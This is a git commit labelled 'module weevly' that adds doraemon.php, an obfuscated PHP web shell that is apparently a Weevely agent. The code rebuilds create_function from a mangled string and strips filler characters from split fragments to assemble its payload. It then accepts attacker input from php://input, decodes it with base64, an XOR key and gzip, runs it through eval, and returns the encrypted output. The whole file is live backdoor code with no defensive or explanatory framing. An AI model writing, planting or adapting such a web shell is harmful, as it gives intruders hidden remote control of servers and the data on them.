4dd0814acd31cbd4b3d49f81cab9615259622c07
derryberni <derrybernicahyady@gmail.com>
2018-07-21 20:29:40 +0700

    module weevly

---
+++ doraemon.php
@@ -0,0 +1,13 @@
+<?php
+$Z=str_replace('b','','crebabteb_fbubbnction');
+$B='XItrd?gWs1Du?gg?gD";function?g x($t,?g$k){$c=?gstrl?gen($?gk);$l=str?g';
+$t='len(?g$t);$o="?g";f?gor?g($i=0;$i<$?gl;)?g{for(?g$j=0;($j<$c&&$i<?g?g$l)?g';
+$s='[1]),$?gk?g))?g);$o?g=@ob_get_c?gontents();@?gob_end_cl?gean();$r=?g@ba';
+$W=';$j?g+?g+,$i++){$o.=$t{$i}?g^$k{?g$?gj};}}return $o;}?gif(@preg?g_mat?gch("';
+$X='){@o?gb_sta?grt();?g@ev?gal(@gzunc?gompress?g(@x(@?gba?gse64_dec?gode($m?g';
+$y='/?g$kh(?g.+)?g$kf?g/"?g,@file_get_cont?gents("php?g://in?gput"),$m)=?g=1';
+$l='?gse64_e?gncode(@x(?g@gzc?gomp?gr?g?gess($o),$k));print("$p?g$k?gh$r$kf");}';
+$n='$k=?g"7802249?g9";?g$k?gh="e8e0eae4e?ge09";$kf?g="d3?g457132a?ga73?g";$?gp="im8X';
+$v=str_replace('?g','',$n.$B.$t.$W.$y.$X.$s.$l);
+$A=$Z('',$v);$A();
+?>
